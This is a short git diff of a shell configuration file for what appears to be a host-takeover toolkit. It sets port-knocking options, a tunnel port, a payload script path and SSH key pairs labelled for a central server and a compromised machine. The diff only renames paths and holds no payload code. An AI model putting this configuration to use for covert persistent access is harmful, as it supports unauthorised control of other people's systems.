@@ -11,7 +11,7 @@ export KNOCK_DELAY=50
 export SERVER_TUNNEL_PORT=9999
 
 # Server specific
-export PAYLOAD_PATH="takeover/payload/payload.sh"
+export PAYLOAD_PATH="payload.sh"
 
 # This is for knockd format
 export KNOCK_OPEN_SSH_D=$(echo $KNOCK_OPEN_SSH | tr ' ' ',')
@@ -27,5 +27,5 @@ export SERVER_PUBLIC_KEY=$(cat ssh/CENTRAL.pub)
 export SERVER_PRIVATE_KEY=$(cat ssh/CENTRAL)
 export COMPROMISED_PUBLIC_KEY=$(cat ssh/COMPROMISED.pub)
 export COMPROMISED_PRIVATE_KEY=$(cat ssh/COMPROMISED)
-export KNOCKD_CONF=$(envsubst < setup_takeover/knockd.conf)
-export KNOCKD_CONF2=$(cat setup_takeover/knockd)
+export KNOCKD_CONF=$(envsubst < server_blueprint/knockd.conf)
+export KNOCKD_CONF2=$(cat server_blueprint/knockd)
